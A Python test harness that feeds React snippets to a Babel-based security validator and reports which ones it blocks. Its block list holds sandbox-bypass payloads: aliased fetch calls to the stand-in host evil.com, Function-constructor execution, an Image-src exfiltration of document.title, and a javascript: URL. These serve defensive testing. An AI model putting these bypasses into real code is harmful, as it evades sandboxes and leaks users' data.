import json
import subprocess

VALIDATOR = r"babel_validator\validate.mjs"

WRAP = """import React from "react";
export default function T() {
  __BODY__
  return <div>hi</div>;
}
"""

SHOULD_BLOCK = {
    "comma_window": '(0, window).fetch("https://evil.com");',
    "reflect_get": 'Reflect.get(window, "fetch")("https://evil.com");',
    "fn_constructor": '(() => {}).constructor("return 1")();',
    "string_constructor": '"".constructor.constructor("return 1")();',
    "document_defaultView": 'document.defaultView.fetch("https://evil.com");',
    "window_in_array": '[window][0].fetch("https://evil.com");',
    "ternary_alias": 'const w = true ? window : null; w.fetch("https://evil.com");',
    "window_as_argument": 'function f(w) { return w.fetch("https://evil.com"); } f(window);',
    "image_exfil": 'new Image().src = "https://evil.com/?d=" + document.title;',
    "createElement_script": 'document.createElement("script");',
    "javascript_url": 'const el = <a href="javascript:alert(1)">x</a>;',
}

SHOULD_ALLOW = {
    "state_named_location": 'const [location, setLocation] = React.useState("");',
    "object_with_fetch_prop": 'const user = { fetch: 1 }; console.log(user.fetch);',
    "map_jsx": 'const items = ["a"].map((x) => <li key={x}>{x}</li>);',
    "onchange_handler": 'const h = (e) => console.log(e.target.value);',
    "local_top_variable": 'const top = 1; console.log(top);',
}


def run(body):
    code = WRAP.replace("__BODY__", body)
    p = subprocess.run(
        ["node", VALIDATOR],
        input=code, capture_output=True, text=True, encoding="utf-8",
    )
    try:
        return json.loads(p.stdout)
    except Exception:
        return {"valid": None, "stage": "bad output", "securityFlags": [], "raw": p.stdout + p.stderr}


def verdict(r):
    if r["valid"] is True:
        return "ALLOWED"
    if r["valid"] is False:
        kinds = ",".join(sorted({f.get("type", "?") for f in r.get("securityFlags", [])})) or r.get("stage")
        return "BLOCKED (" + kinds + ")"
    return "ERROR: " + str(r.get("raw", ""))[:200]


missed = []
print("=== Should be BLOCKED ===")
for name, body in SHOULD_BLOCK.items():
    v = verdict(run(body))
    print(f"{v:50s} <- {name}")
    if not v.startswith("BLOCKED"):
        missed.append(name)

wrongly_blocked = []
print()
print("=== Should be ALLOWED (false-positive check) ===")
for name, body in SHOULD_ALLOW.items():
    v = verdict(run(body))
    print(f"{v:50s} <- {name}")
    if v != "ALLOWED":
        wrongly_blocked.append(name)

print()
print(f"Bypasses that got through: {len(missed)}/{len(SHOULD_BLOCK)} -> {missed}")
print(f"Legitimate code wrongly blocked: {len(wrongly_blocked)}/{len(SHOULD_ALLOW)} -> {wrongly_blocked}")